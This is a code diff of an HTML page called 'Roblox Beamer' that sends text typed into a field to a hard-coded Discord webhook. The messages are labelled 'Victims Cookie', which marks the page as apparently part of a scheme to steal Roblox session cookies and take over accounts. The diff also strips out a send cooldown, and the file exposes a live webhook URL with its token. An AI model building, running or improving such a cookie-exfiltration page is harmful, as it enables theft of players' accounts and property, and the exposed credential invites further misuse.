@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Beamer</title>
+  <title>testRoblox Beamer</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -13,15 +13,15 @@
     #messageBar {
       margin-top: 20px;
     }
-    textarea, button {
+    input, button {
       padding: 10px;
       font-size: 16px;
     }
-    textarea {
+    input {
       width: 70%;
-      height: 200px; /* Increased height for multi-line input */
       margin-right: 10px;
-      resize: vertical; /* Allows user to resize the textarea vertically */
+      height: 150px; /* Making the input area bigger */
+      resize: none; /* Disable resizing */
     }
     button {
       background-color: #007bff;
@@ -55,26 +55,20 @@
     // Replace with your Discord Webhook URL
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1320573593821773845/QvHOAwVTwyuwh6O-HT15JQSZYD_W9hxsYcfnOe3L-Ig7vENas32Ybj5p2_3VVHYiHdQg";
 
-    const cooldownTime = 120; // Cooldown duration in seconds
-    const cooldownKey = "sendCooldown"; // Key for localStorage
-
     function sendMessage() {
       const messageInput = document.getElementById("messageInput");
       const sendButton = document.getElementById("sendButton");
       const errorMessage = document.getElementById("errorMessage");
-      let message = messageInput.value;
+      const message = messageInput.value;
 
       errorMessage.textContent = ""; // Clear any previous error messages
-
-      // Add triple backticks around the message for Discord code block format
-      message = `\`\`\`${message}\`\`\``;
 
       // Create the embed payload
       const embedPayload = {
         embeds: [
           {
             title: "Victims Cookie", // Embed title
-            description: message, // Embed description with backticks
+            description: message, // Embed description
             color: 16711680, // Embed color (red in this case)
             timestamp: new Date().toISOString() // Adds a timestamp
           }
@@ -91,7 +85,6 @@
           if (response.ok) {
             document.getElementById("status").textContent = "Message sent successfully!";
             messageInput.value = ""; // Clear the input
-            startCooldown(sendButton); // Start cooldown timer
           } else {
             throw new Error("Failed to send the message.");
           }
@@ -101,41 +94,6 @@
           document.getElementById("status").textContent = "Failed to send the message.";
         });
     }
-
-    function startCooldown(button) {
-      const cooldownEnd = Date.now() + cooldownTime * 1000; // Calculate cooldown end time
-      localStorage.setItem(cooldownKey, cooldownEnd); // Save cooldown end time to localStorage
-      button.disabled = true; // Disable the button
-      updateCooldown(button, cooldownEnd);
-    }
-
-    function updateCooldown(button, cooldownEnd) {
-      const timer = setInterval(() => {
-        const timeLeft = Math.ceil((cooldownEnd - Date.now()) / 1000);
-
-        if (timeLeft > 0) {
-          button.textContent = `Wait ${timeLeft}s`; // Show countdown
-        } else {
-          clearInterval(timer); // Stop the timer
-          button.textContent = "Send"; // Reset button text
-          button.disabled = false; // Re-enable the button
-          localStorage.removeItem(cooldownKey); // Remove cooldown from localStorage
-        }
-      }, 1000); // Update every second
-    }
-
-    function checkCooldown() {
-      const sendButton = document.getElementById("sendButton");
-      const cooldownEnd = localStorage.getItem(cooldownKey);
-
-      if (cooldownEnd && Date.now() < cooldownEnd) {
-        sendButton.disabled = true; // Keep the button disabled
-        updateCooldown(sendButton, cooldownEnd); // Resume countdown
-      }
-    }
-
-    // Check cooldown on page load
-    window.onload = checkCooldown;
   </script>
 </body>
 </html>
